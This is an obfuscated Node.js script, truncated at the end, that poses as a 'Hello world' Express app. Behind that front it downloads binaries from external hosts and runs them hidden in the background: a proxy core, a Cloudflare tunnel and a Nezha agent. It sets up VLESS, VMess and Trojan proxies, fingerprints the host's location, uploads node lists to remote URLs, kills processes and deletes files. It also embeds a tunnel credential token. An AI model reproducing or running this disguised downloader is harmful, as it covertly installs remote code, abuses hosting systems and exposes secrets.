const _0xf99686=_0x1ee8;(function(_0x228555,_0x43c518){const _0x4c869f={_0x2cf1b5:0x26b,_0x118cb9:0x1bc,_0x5c9491:0x1d5,_0x26c2c0:0x1fb,_0x3d0fbb:0x1f8},_0x45b875=_0x1ee8,_0x547eb1=_0x228555();while(!![]){try{const _0x596c88=-parseInt(_0x45b875(_0x4c869f._0x2cf1b5))/0x1+-parseInt(_0x45b875(0x1b9))/0x2+parseInt(_0x45b875(_0x4c869f._0x118cb9))/0x3+parseInt(_0x45b875(_0x4c869f._0x5c9491))/0x4*(parseInt(_0x45b875(_0x4c869f._0x26c2c0))/0x5)+-parseInt(_0x45b875(0x207))/0x6+parseInt(_0x45b875(_0x4c869f._0x3d0fbb))/0x7+-parseInt(_0x45b875(0x264))/0x8;if(_0x596c88===_0x43c518)break;else _0x547eb1['push'](_0x547eb1['shift']());}catch(_0x484f58){_0x547eb1['push'](_0x547eb1['shift']());}}}(_0x5b06,0x41dc4));function _0x1ee8(_0x1cbc41,_0x281186){const _0x5b0651=_0x5b06();return _0x1ee8=function(_0x1ee8f8,_0x49880d){_0x1ee8f8=_0x1ee8f8-0x1ae;let _0x23bce9=_0x5b0651[_0x1ee8f8];return _0x23bce9;},_0x1ee8(_0x1cbc41,_0x281186);}const express=require(_0xf99686(0x1f4)),app=express(),axios=require(_0xf99686(0x1de)),os=require('os'),fs=require('fs'),path=require(_0xf99686(0x262)),{promisify}=require('util'),exec=promisify(require(_0xf99686(0x1f1))['exec']),{execSync}=require(_0xf99686(0x1f1)),UPLOAD_URL=process[_0xf99686(0x261)]['UPLOAD_URL']||'',PROJECT_URL=process[_0xf99686(0x261)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0xf99686(0x261)][_0xf99686(0x251)]||![],FILE_PATH=process['env']['FILE_PATH']||_0xf99686(0x229),SUB_PATH=process[_0xf99686(0x261)][_0xf99686(0x1ca)]||'2026',PORT=process[_0xf99686(0x261)][_0xf99686(0x230)]||process[_0xf99686(0x261)][_0xf99686(0x1b7)]||0xbb8,UUID=process[_0xf99686(0x261)][_0xf99686(0x1df)]||_0xf99686(0x1ff),NEZHA_SERVER=process[_0xf99686(0x261)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xf99686(0x261)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0xf99686(0x238)]||'',ARGO_DOMAIN=process[_0xf99686(0x261)]['ARGO_DOMAIN']||_0xf99686(0x20d),ARGO_AUTH=process[_0xf99686(0x261)]['ARGO_AUTH']||_0xf99686(0x244),ARGO_PORT=process[_0xf99686(0x261)]['ARGO_PORT']||0x1f41,CFIP=process[_0xf99686(0x261)][_0xf99686(0x259)]||_0xf99686(0x1ea),CFPORT=process[_0xf99686(0x261)][_0xf99686(0x245)]||0x1bb,NAME=process[_0xf99686(0x261)][_0xf99686(0x26c)]||_0xf99686(0x1cb);!fs[_0xf99686(0x25a)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xf99686(0x269)](FILE_PATH+'\x20is\x20created')):console[_0xf99686(0x269)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3fc6fc={_0x575544:0x26a,_0x152dba:0x212},_0x16199c=_0xf99686,_0x590e5b=_0x16199c(0x1cd);let _0x4414c8='';for(let _0x4b3011=0x0;_0x4b3011<0x6;_0x4b3011++){_0x4414c8+=_0x590e5b[_0x16199c(_0x3fc6fc._0x575544)](Math[_0x16199c(0x1b6)](Math[_0x16199c(0x1f0)]()*_0x590e5b[_0x16199c(_0x3fc6fc._0x152dba)]));}return _0x4414c8;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xf99686(0x268)](FILE_PATH,npmName),phpPath=path[_0xf99686(0x268)](FILE_PATH,phpName),webPath=path[_0xf99686(0x268)](FILE_PATH,webName),botPath=path[_0xf99686(0x268)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0xf99686(0x1e8)),listPath=path[_0xf99686(0x268)](FILE_PATH,_0xf99686(0x1b5)),bootLogPath=path[_0xf99686(0x268)](FILE_PATH,_0xf99686(0x208)),configPath=path[_0xf99686(0x268)](FILE_PATH,_0xf99686(0x250));function deleteNodes(){const _0x2c2437={_0x555c2f:0x25a,_0x4f0fb5:0x1d0,_0x536366:0x20e,_0x3bfd90:0x20a,_0x13e817:0x21b},_0xe9bb78=_0xf99686;try{if(!UPLOAD_URL)return;if(!fs[_0xe9bb78(_0x2c2437._0x555c2f)](subPath))return;let _0xcc090b;try{_0xcc090b=fs['readFileSync'](subPath,_0xe9bb78(0x1fc));}catch{return null;}const _0x400521=Buffer[_0xe9bb78(0x1e7)](_0xcc090b,_0xe9bb78(0x226))[_0xe9bb78(0x231)]('utf-8'),_0x392afe=_0x400521[_0xe9bb78(0x23d)]('\x0a')[_0xe9bb78(0x1b8)](_0x527527=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x527527));if(_0x392afe[_0xe9bb78(0x212)]===0x0)return;return axios[_0xe9bb78(_0x2c2437._0x4f0fb5)](UPLOAD_URL+_0xe9bb78(_0x2c2437._0x536366),JSON[_0xe9bb78(0x1e1)]({'nodes':_0x392afe}),{'headers':{'Content-Type':_0xe9bb78(_0x2c2437._0x3bfd90)}})[_0xe9bb78(_0x2c2437._0x13e817)](_0x34b168=>{return null;}),null;}catch(_0x192a06){return null;}}function cleanupOldFiles(){const _0x1f6b0e={_0x43fe5e:0x204,_0x2291d8:0x224},_0x12fc32={_0x2bf013:0x22b},_0xb96309=_0xf99686;try{const _0x30f8aa=fs[_0xb96309(_0x1f6b0e._0x43fe5e)](FILE_PATH);_0x30f8aa[_0xb96309(_0x1f6b0e._0x2291d8)](_0x119ad1=>{const _0x310423=_0xb96309,_0x44968c=path['join'](FILE_PATH,_0x119ad1);try{const _0x23350d=fs[_0x310423(0x1d3)](_0x44968c);_0x23350d[_0x310423(_0x12fc32._0x2bf013)]()&&fs[_0x310423(0x23a)](_0x44968c);}catch(_0x85661b){}});}catch(_0x336033){}}app[_0xf99686(0x209)]('/',function(_0x543dea,_0x559997){const _0x488901={_0x5620e2:0x1ae},_0x31dfb6=_0xf99686;_0x559997[_0x31dfb6(_0x488901._0x5620e2)]('Hello\x20world!');});async function generateConfig(){const _0x1eebfc={_0x5c38ef:0x234,_0x4b9243:0x258,_0x56caf6:0x252,_0x3f1eee:0x258,_0x5b1547:0x258,_0x43dfb2:0x258,_0x1f9022:0x223,_0x3324e8:0x1dd,_0x1f803d:0x24f,_0x21ba73:0x1e3,_0x48b96f:0x217,_0x1ddbe1:0x1bf,_0x3b49ee:0x1ce,_0x1c4af1:0x250,_0x234974:0x1e1},_0x92db87=_0xf99686,_0xd5056d={'log':{'access':_0x92db87(0x22f),'error':_0x92db87(0x22f),'loglevel':_0x92db87(0x258)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x92db87(_0x1eebfc._0x5c38ef),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x92db87(_0x1eebfc._0x4b9243),'fallbacks':[{'dest':0xbb9},{'path':_0x92db87(0x223),'dest':0xbba},{'path':_0x92db87(_0x1eebfc._0x56caf6),'dest':0xbbb},{'path':_0x92db87(0x217),'dest':0xbbc}]},'streamSettings':{'network':_0x92db87(0x1af)}},{'port':0xbb9,'listen':_0x92db87(0x1dd),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x92db87(_0x1eebfc._0x3f1eee)},'streamSettings':{'network':_0x92db87(0x1af),'security':_0x92db87(_0x1eebfc._0x5b1547)}},{'port':0xbba,'listen':_0x92db87(0x1dd),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x92db87(_0x1eebfc._0x43dfb2)},'streamSettings':{'network':'ws','security':_0x92db87(0x258),'wsSettings':{'path':_0x92db87(_0x1eebfc._0x1f9022)}},'sniffing':{'enabled':!![],'destOverride':[_0x92db87(0x1e3),_0x92db87(0x22c),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x92db87(_0x1eebfc._0x3324e8),'protocol':_0x92db87(_0x1eebfc._0x1f803d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x92db87(_0x1eebfc._0x21ba73),_0x92db87(0x22c),_0x92db87(0x220)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x92db87(0x1dd),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x92db87(0x258),'wsSettings':{'path':_0x92db87(_0x1eebfc._0x48b96f)}},'sniffing':{'enabled':!![],'destOverride':[_0x92db87(0x1e3),_0x92db87(0x22c),_0x92db87(0x220)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':_0x92db87(_0x1eebfc._0x1ddbe1),'tag':_0x92db87(_0x1eebfc._0x3b49ee)}]};fs[_0x92db87(0x23c)](path[_0x92db87(0x268)](FILE_PATH,_0x92db87(_0x1eebfc._0x1c4af1)),JSON[_0x92db87(_0x1eebfc._0x234974)](_0xd5056d,null,0x2));}function getSystemArchitecture(){const _0x16ab2a={_0x423a3a:0x233,_0x2b734c:0x211,_0x552942:0x232},_0x1d7b63=_0xf99686,_0x592dcd=os[_0x1d7b63(_0x16ab2a._0x423a3a)]();return _0x592dcd===_0x1d7b63(_0x16ab2a._0x2b734c)||_0x592dcd===_0x1d7b63(0x21c)||_0x592dcd===_0x1d7b63(0x1c9)?_0x1d7b63(_0x16ab2a._0x2b734c):_0x1d7b63(_0x16ab2a._0x552942);}function downloadFile(_0x21148c,_0x922a58,_0x31c1e8){const _0x596e30={_0x5b2d68:0x25a,_0x3b435f:0x21b},_0x1fb726={_0x5a7720:0x1e9,_0x4e2d69:0x263,_0x53c0d4:0x23f,_0xe5275b:0x248},_0x360826={_0x3590e8:0x23b},_0x40271c=_0xf99686,_0x415090=_0x21148c;!fs[_0x40271c(_0x596e30._0x5b2d68)](FILE_PATH)&&fs[_0x40271c(0x214)](FILE_PATH,{'recursive':!![]});const _0xbe17be=fs[_0x40271c(0x24e)](_0x415090);axios({'method':'get','url':_0x922a58,'responseType':'stream'})[_0x40271c(0x24c)](_0x47a99c=>{const _0x265668={_0xb12f4:0x1b1,_0x450511:0x256,_0x5a6f07:0x248},_0x540d87={_0x522421:0x1c4,_0x307018:0x256},_0x4e7e5d=_0x40271c;_0x47a99c[_0x4e7e5d(0x21e)][_0x4e7e5d(_0x360826._0x3590e8)](_0xbe17be),_0xbe17be['on'](_0x4e7e5d(0x201),()=>{const _0x163c04=_0x4e7e5d;_0xbe17be[_0x163c04(_0x540d87._0x522421)](),console['log']('Download\x20'+path[_0x163c04(_0x540d87._0x307018)](_0x415090)+_0x163c04(0x1ec)),_0x31c1e8(null,_0x415090);}),_0xbe17be['on']('error',_0x4ceb15=>{const _0x8f98b3=_0x4e7e5d;fs[_0x8f98b3(_0x265668._0xb12f4)](_0x415090,()=>{});const _0x3c18d5=_0x8f98b3(0x1e9)+path[_0x8f98b3(_0x265668._0x450511)](_0x415090)+_0x8f98b3(0x263)+_0x4ceb15[_0x8f98b3(0x23f)];console[_0x8f98b3(_0x265668._0x5a6f07)](_0x3c18d5),_0x31c1e8(_0x3c18d5);});})[_0x40271c(_0x596e30._0x3b435f)](_0x4a1b11=>{const _0x5be893=_0x40271c,_0x91ca40=_0x5be893(_0x1fb726._0x5a7720)+path[_0x5be893(0x256)](_0x415090)+_0x5be893(_0x1fb726._0x4e2d69)+_0x4a1b11[_0x5be893(_0x1fb726._0x53c0d4)];console[_0x5be893(_0x1fb726._0xe5275b)](_0x91ca40),_0x31c1e8(_0x91ca40);});}async function downloadFilesAndRun(){const _0x1db383={_0x286769:0x212,_0x425642:0x269,_0x2af752:0x213,_0xcfc1fc:0x1c0,_0x20c59c:0x257,_0x105d4f:0x267,_0x506ed9:0x23d,_0x56a7ae:0x255,_0x2e6373:0x1d2,_0x4ae8ff:0x20b,_0x337612:0x236,_0x121883:0x1f3,_0x370bec:0x1da,_0x371947:0x269,_0x6e4276:0x216,_0x233f7d:0x248,_0x13e62d:0x1d9,_0x17c3dc:0x1e4,_0x41dd98:0x1bb,_0x55124e:0x22e,_0x2282df:0x206,_0x22d034:0x248,_0x2d0627:0x25a,_0x8b63e2:0x235,_0x3b7152:0x22a,_0x185d42:0x203,_0x5e7517:0x269,_0x3cdc44:0x1e2},_0x2d643c={_0x4997d2:0x224},_0x5b668e=_0xf99686,_0x231817=getSystemArchitecture(),_0x33dc23=getFilesForArchitecture(_0x231817);if(_0x33dc23[_0x5b668e(_0x1db383._0x286769)]===0x0){console[_0x5b668e(_0x1db383._0x425642)](_0x5b668e(_0x1db383._0x2af752));return;}const _0x207c46=_0x33dc23['map'](_0x5a1ff0=>{return new Promise((_0x4bcd39,_0x59fb63)=>{const _0x2087e6=_0x1ee8;downloadFile(_0x5a1ff0[_0x2087e6(0x25c)],_0x5a1ff0[_0x2087e6(0x1f2)],(_0x58988b,_0x1fd6f6)=>{_0x58988b?_0x59fb63(_0x58988b):_0x4bcd39(_0x1fd6f6);});});});try{await Promise[_0x5b668e(_0x1db383._0xcfc1fc)](_0x207c46);}catch(_0x534c65){console['error'](_0x5b668e(_0x1db383._0x20c59c),_0x534c65);return;}function _0x774076(_0x511ca7){const _0x405854={_0xa677fa:0x25a,_0x17cfc9:0x1cc},_0x488504={_0x86d9a3:0x248,_0x3073a1:0x269,_0x585dbb:0x1c3,_0x39c39e:0x231},_0x7d8dd4=_0x5b668e,_0xf9937d=0x1fd;_0x511ca7[_0x7d8dd4(_0x2d643c._0x4997d2)](_0x1442bb=>{const _0x371a82=_0x7d8dd4;fs[_0x371a82(_0x405854._0xa677fa)](_0x1442bb)&&fs[_0x371a82(_0x405854._0x17cfc9)](_0x1442bb,_0xf9937d,_0x105cd7=>{const _0x3c2896=_0x371a82;_0x105cd7?console[_0x3c2896(_0x488504._0x86d9a3)](_0x3c2896(0x1d6)+_0x1442bb+':\x20'+_0x105cd7):console[_0x3c2896(_0x488504._0x3073a1)](_0x3c2896(_0x488504._0x585dbb)+_0x1442bb+':\x20'+_0xf9937d[_0x3c2896(_0x488504._0x39c39e)](0x8));});});}const _0x588157=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x774076(_0x588157);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x46c9f9=NEZHA_SERVER[_0x5b668e(_0x1db383._0x105d4f)](':')?NEZHA_SERVER[_0x5b668e(_0x1db383._0x506ed9)](':')[_0x5b668e(_0x1db383._0x56a7ae)]():'',_0x2628f0=new Set([_0x5b668e(_0x1db383._0x2e6373),_0x5b668e(0x1ba),'2096',_0x5b668e(0x1e4),_0x5b668e(0x1db),_0x5b668e(0x228)]),_0x314b00=_0x2628f0[_0x5b668e(0x254)](_0x46c9f9)?_0x5b668e(_0x1db383._0x4ae8ff):'false',_0x1f047c='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5b668e(0x1c1)+NEZHA_SERVER+_0x5b668e(0x1b2)+_0x314b00+_0x5b668e(_0x1db383._0x337612)+UUID;fs['writeFileSync'](path[_0x5b668e(0x268)](FILE_PATH,_0x5b668e(_0x1db383._0x121883)),_0x1f047c);const _0x28a327=_0x5b668e(0x206)+phpPath+_0x5b668e(_0x1db383._0x370bec)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x28a327),console[_0x5b668e(_0x1db383._0x371947)](phpName+_0x5b668e(_0x1db383._0x6e4276)),await new Promise(_0xb7e8e8=>setTimeout(_0xb7e8e8,0x3e8));}catch(_0x53c264){console[_0x5b668e(_0x1db383._0x233f7d)](_0x5b668e(_0x1db383._0x13e62d)+_0x53c264);}}else{let _0x154872='';const _0x33ffed=[_0x5b668e(0x1d2),_0x5b668e(0x1ba),'2096',_0x5b668e(_0x1db383._0x17c3dc),_0x5b668e(0x1db),_0x5b668e(0x228)];_0x33ffed[_0x5b668e(0x267)](NEZHA_PORT)&&(_0x154872=_0x5b668e(_0x1db383._0x41dd98));const _0x1a7491=_0x5b668e(0x206)+npmPath+_0x5b668e(_0x1db383._0x55124e)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x154872+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1a7491),console[_0x5b668e(0x269)](npmName+_0x5b668e(0x216)),await new Promise(_0xe9624f=>setTimeout(_0xe9624f,0x3e8));}catch(_0x1b8262){console[_0x5b668e(0x248)](_0x5b668e(0x1d7)+_0x1b8262);}}}else console[_0x5b668e(0x269)](_0x5b668e(0x242));const _0x358a02=_0x5b668e(_0x1db383._0x2282df)+webPath+'\x20-c\x20'+FILE_PATH+_0x5b668e(0x1ed);try{await exec(_0x358a02),console['log'](webName+_0x5b668e(0x216)),await new Promise(_0x5e10f9=>setTimeout(_0x5e10f9,0x3e8));}catch(_0x3cf517){console[_0x5b668e(_0x1db383._0x22d034)]('web\x20running\x20error:\x20'+_0x3cf517);}if(fs[_0x5b668e(_0x1db383._0x2d0627)](botPath)){let _0x52be53;if(ARGO_AUTH[_0x5b668e(_0x1db383._0x8b63e2)](/^[A-Z0-9a-z=]{120,250}$/))_0x52be53='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5b668e(0x235)](/TunnelSecret/)?_0x52be53=_0x5b668e(_0x1db383._0x3b7152)+FILE_PATH+'/tunnel.yml\x20run':_0x52be53='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5b668e(0x1c5)+ARGO_PORT;try{await exec(_0x5b668e(0x206)+botPath+'\x20'+_0x52be53+_0x5b668e(_0x1db383._0x185d42)),console[_0x5b668e(_0x1db383._0x5e7517)](botName+_0x5b668e(0x216)),await new Promise(_0x23b5f7=>setTimeout(_0x23b5f7,0x7d0));}catch(_0x33a613){console[_0x5b668e(0x248)](_0x5b668e(_0x1db383._0x3cdc44)+_0x33a613);}}await new Promise(_0x4c7c8f=>setTimeout(_0x4c7c8f,0x1388));}function getFilesForArchitecture(_0x3696e8){const _0x4e74b3={_0x19f706:0x260,_0x2afc03:0x265,_0x4e0ae1:0x221,_0xb29082:0x211,_0x456b88:0x247,_0x1b8e65:0x24d,_0x786e5:0x211,_0x54f31d:0x24d},_0x24ebe7=_0xf99686;let _0x21ccce;_0x3696e8===_0x24ebe7(0x211)?_0x21ccce=[{'fileName':webPath,'fileUrl':_0x24ebe7(0x1f7)},{'fileName':botPath,'fileUrl':_0x24ebe7(_0x4e74b3._0x19f706)}]:_0x21ccce=[{'fileName':webPath,'fileUrl':_0x24ebe7(_0x4e74b3._0x2afc03)},{'fileName':botPath,'fileUrl':_0x24ebe7(_0x4e74b3._0x4e0ae1)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x285187=_0x3696e8===_0x24ebe7(_0x4e74b3._0xb29082)?_0x24ebe7(0x21d):_0x24ebe7(_0x4e74b3._0x456b88);_0x21ccce[_0x24ebe7(_0x4e74b3._0x1b8e65)]({'fileName':npmPath,'fileUrl':_0x285187});}else{const _0x36baf6=_0x3696e8===_0x24ebe7(_0x4e74b3._0x786e5)?_0x24ebe7(0x1dc):'https://amd64.ssss.nyc.mn/v1';_0x21ccce[_0x24ebe7(_0x4e74b3._0x54f31d)]({'fileName':phpPath,'fileUrl':_0x36baf6});}}return _0x21ccce;}function argoType(){const _0x573d99={_0x499d33:0x23c,_0x32bbdf:0x1c8,_0x2c5d85:0x266,_0x1c4cc3:0x246,_0x5faded:0x269,_0x2b4ee3:0x25e},_0x489489=_0xf99686;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x489489(0x267)](_0x489489(0x222))){fs[_0x489489(_0x573d99._0x499d33)](path['join'](FILE_PATH,_0x489489(_0x573d99._0x32bbdf)),ARGO_AUTH);const _0x2015be=_0x489489(_0x573d99._0x2c5d85)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x489489(0x268)](FILE_PATH,_0x489489(0x1c8))+_0x489489(_0x573d99._0x1c4cc3)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x489489(0x20f);fs['writeFileSync'](path['join'](FILE_PATH,_0x489489(0x21a)),_0x2015be);}else console[_0x489489(_0x573d99._0x5faded)](_0x489489(_0x573d99._0x2b4ee3));}async function extractDomains(){const _0x4a3dcb={_0x127842:0x1f6,_0x221f15:0x1bd,_0x590ad7:0x224,_0x4b7332:0x269,_0x513286:0x268,_0x15ded1:0x208,_0x3d588e:0x1c5,_0x52a495:0x1e2,_0x54669e:0x248,_0x84c62c:0x227},_0x26e22b={_0x3a3e72:0x209,_0x21fb5b:0x21e,_0x1f4f49:0x1fe,_0x4e4699:0x21e,_0x183594:0x237,_0x43f5e1:0x1cf,_0x32d609:0x1e6,_0x3d03b2:0x1b0},_0xc0c215={_0x2aa1c1:0x1eb,_0x69eaa3:0x1ef,_0x37f846:0x26a,_0xa62c49:0x21f},_0x55d133=_0xf99686;let _0x29cd22;if(ARGO_AUTH&&ARGO_DOMAIN)_0x29cd22=ARGO_DOMAIN,console['log'](_0x55d133(_0x4a3dcb._0x127842),_0x29cd22),await _0x3ea608(_0x29cd22);else try{const _0xa7dc86=fs[_0x55d133(_0x4a3dcb._0x221f15)](path['join'](FILE_PATH,_0x55d133(0x208)),_0x55d133(0x1fc)),_0x4d04f8=_0xa7dc86[_0x55d133(0x23d)]('\x0a'),_0x2c1db7=[];_0x4d04f8[_0x55d133(_0x4a3dcb._0x590ad7)](_0x54cc76=>{const _0x11db7d=_0x55d133,_0x56c482=_0x54cc76[_0x11db7d(0x235)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x56c482){const _0x34e0db=_0x56c482[0x1];_0x2c1db7[_0x11db7d(0x1fd)](_0x34e0db);}});if(_0x2c1db7['length']>0x0)_0x29cd22=_0x2c1db7[0x0],console['log'](_0x55d133(0x1b4),_0x29cd22),await _0x3ea608(_0x29cd22);else{console[_0x55d133(_0x4a3dcb._0x4b7332)](_0x55d133(0x26f)),fs[_0x55d133(0x23a)](path[_0x55d133(_0x4a3dcb._0x513286)](FILE_PATH,_0x55d133(_0x4a3dcb._0x15ded1)));async function _0x56845a(){const _0x598e83=_0x55d133;try{process[_0x598e83(0x23e)]===_0x598e83(_0xc0c215._0x2aa1c1)?await exec(_0x598e83(0x200)+botName+_0x598e83(0x225)):await exec(_0x598e83(_0xc0c215._0x69eaa3)+botName[_0x598e83(_0xc0c215._0x37f846)](0x0)+']'+botName['substring'](0x1)+_0x598e83(_0xc0c215._0xa62c49));}catch(_0x292848){}}_0x56845a(),await new Promise(_0x2f8069=>setTimeout(_0x2f8069,0xbb8));const _0x35d7bc=_0x55d133(0x219)+FILE_PATH+_0x55d133(_0x4a3dcb._0x3d588e)+ARGO_PORT;try{await exec(_0x55d133(0x206)+botPath+'\x20'+_0x35d7bc+_0x55d133(0x203)),console[_0x55d133(0x269)](botName+'\x20is\x20running'),await new Promise(_0x64782f=>setTimeout(_0x64782f,0xbb8)),await extractDomains();}catch(_0x14256f){console[_0x55d133(0x248)](_0x55d133(_0x4a3dcb._0x52a495)+_0x14256f);}}}catch(_0xb36f41){console[_0x55d133(_0x4a3dcb._0x54669e)](_0x55d133(_0x4a3dcb._0x84c62c),_0xb36f41);}async function _0x4ccf8a(){const _0x55f1c8=_0x55d133;try{const _0x579879=await axios[_0x55f1c8(_0x26e22b._0x3a3e72)](_0x55f1c8(0x1d8),{'timeout':0xbb8});if(_0x579879[_0x55f1c8(_0x26e22b._0x21fb5b)]&&_0x579879['data']['country_code']&&_0x579879[_0x55f1c8(0x21e)][_0x55f1c8(_0x26e22b._0x1f4f49)])return _0x579879['data'][_0x55f1c8(0x22d)]+'_'+_0x579879[_0x55f1c8(_0x26e22b._0x4e4699)][_0x55f1c8(0x1fe)];}catch(_0x31c6ac){try{const _0x4622d5=await axios[_0x55f1c8(_0x26e22b._0x3a3e72)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4622d5[_0x55f1c8(0x21e)]&&_0x4622d5[_0x55f1c8(0x21e)][_0x55f1c8(_0x26e22b._0x183594)]===_0x55f1c8(_0x26e22b._0x43f5e1)&&_0x4622d5['data'][_0x55f1c8(0x1e6)]&&_0x4622d5[_0x55f1c8(0x21e)]['org'])return _0x4622d5[_0x55f1c8(_0x26e22b._0x21fb5b)][_0x55f1c8(_0x26e22b._0x32d609)]+'_'+_0x4622d5[_0x55f1c8(0x21e)][_0x55f1c8(_0x26e22b._0x1f4f49)];}catch(_0x1a6e8b){}}return _0x55f1c8(_0x26e22b._0x3d03b2);}async function _0x3ea608(_0x135910){const _0xd8b329=await _0x4ccf8a(),_0x8f9508=NAME?NAME+'-'+_0xd8b329:_0xd8b329;return new Promise(_0x53ae0b=>{const _0x37e2ba={_0xae0907:0x210,_0x5b19a3:0x25d,_0x4a4a04:0x1c6,_0x3531e5:0x1e5,_0x35db1c:0x249,_0x416a3a:0x215,_0x4160f3:0x240,_0x467981:0x231},_0x3640ca={_0x3e6b43:0x1e7,_0x2eaa83:0x226,_0x5c467a:0x1be,_0x18caa6:0x1f9,_0x2f3de2:0x1ae};setTimeout(()=>{const _0x186a70=_0x1ee8,_0x364115={'v':'2','ps':''+_0x8f9508,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x186a70(0x258),'net':'ws','type':_0x186a70(0x258),'host':_0x135910,'path':_0x186a70(_0x37e2ba._0xae0907),'tls':'tls','sni':_0x135910,'alpn':'','fp':_0x186a70(_0x37e2ba._0x5b19a3)},_0x55fa55='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x135910+'&fp=firefox&type=ws&host='+_0x135910+_0x186a70(_0x37e2ba._0x4a4a04)+_0x8f9508+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x186a70(0x1e1)](_0x364115))[_0x186a70(0x231)](_0x186a70(0x226))+_0x186a70(0x1d1)+UUID+'@'+CFIP+':'+CFPORT+_0x186a70(_0x37e2ba._0x3531e5)+_0x135910+_0x186a70(_0x37e2ba._0x35db1c)+_0x135910+_0x186a70(_0x37e2ba._0x416a3a)+_0x8f9508+_0x186a70(_0x37e2ba._0x4160f3);console['log'](Buffer['from'](_0x55fa55)[_0x186a70(_0x37e2ba._0x467981)](_0x186a70(0x226))),fs[_0x186a70(0x23c)](subPath,Buffer[_0x186a70(0x1e7)](_0x55fa55)[_0x186a70(0x231)](_0x186a70(0x226))),console[_0x186a70(0x269)](FILE_PATH+_0x186a70(0x1b3)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4743dd,_0x413a2f)=>{const _0x24b8b2=_0x186a70,_0xb5a0d4=Buffer[_0x24b8b2(_0x3640ca._0x3e6b43)](_0x55fa55)[_0x24b8b2(0x231)](_0x24b8b2(_0x3640ca._0x2eaa83));_0x413a2f[_0x24b8b2(_0x3640ca._0x5c467a)](_0x24b8b2(_0x3640ca._0x18caa6),_0x24b8b2(0x20c)),_0x413a2f[_0x24b8b2(_0x3640ca._0x2f3de2)](_0xb5a0d4);}),_0x53ae0b(_0x55fa55);},0x7d0);});}}function _0x5b06(){const _0x364911=['\x20is\x20running','/trojan-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tunnel.yml','catch','arm64','https://arm64.ssss.nyc.mn/agent','data','\x22\x20>\x20/dev/null\x202>&1','quic','https://amd64.ssss.nyc.mn/bot','TunnelSecret','/vless-argo','forEach','.exe\x20>\x20nul\x202>&1','base64','Error\x20reading\x20boot.log:','2053','./tmp','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','isFile','tls','country_code','\x20-s\x20','/dev/null','SERVER_PORT','toString','amd','arch','vless','match','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','status','NEZHA_KEY','response','unlinkSync','pipe','writeFileSync','split','platform','message','\x0a\x20\x20\x20\x20','https://oooo.serv00.net/add-url','NEZHA\x20variable\x20is\x20empty,skip\x20running','rm\x20-rf\x20','eyJhIjoiYmQ4YWM2ZmE1Y2NiN2MyODE5MDA5NGI0NDYyOGZlMzAiLCJ0IjoiMzhiMTUwYjYtYzgyMi00NzE1LWI5YzItZDlkYzM1NDAzOTI3IiwicyI6Ill6STBORFF5TmprdFpUSmtPUzAwWlRJMExUZzBPR0V0T1dSaU16VXpOMlF6TlRkayJ9','CFPORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/agent','error','&fp=firefox&type=ws&host=','Skipping\x20adding\x20automatic\x20access\x20task','del\x20/f\x20/q\x20','then','unshift','createWriteStream','vmess','config.json','AUTO_ACCESS','/vmess-argo','test','has','pop','basename','Error\x20downloading\x20files:','none','CFIP','existsSync','listen','fileName','firefox','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x